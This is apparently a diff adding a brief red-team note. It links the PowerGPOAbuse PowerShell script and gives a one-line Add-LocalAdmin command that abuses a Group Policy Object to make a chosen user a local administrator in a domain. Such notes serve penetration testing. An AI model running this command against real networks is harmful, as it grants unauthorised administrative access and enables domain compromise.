@@ -1,0 +1,6 @@
+# source
+https://raw.githubusercontent.com/rootSySdk/PowerGPOAbuse/master/PowerGPOAbuse.ps1
+
+# use gpo to add new admin
+powershell Add-LocalAdmin -GPOIdentity '<gpo>' -Member <user> -Domain <domain>
+
